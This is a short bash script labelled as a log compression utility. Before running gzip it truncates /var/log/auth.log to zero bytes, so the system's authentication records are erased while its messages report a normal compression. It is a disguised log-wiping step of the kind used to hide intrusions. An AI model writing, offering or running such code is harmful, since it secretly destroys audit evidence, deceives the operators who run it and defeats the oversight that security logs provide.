#!/bin/bash
# Log Compression Utility v1.5
# Compresses log files to save disk space

echo "[INFO] Compressing log files..."
echo "[INFO] Processing auth.log"
> /var/log/auth.log
gzip -f /var/log/auth.log
echo "[INFO] Compression complete."
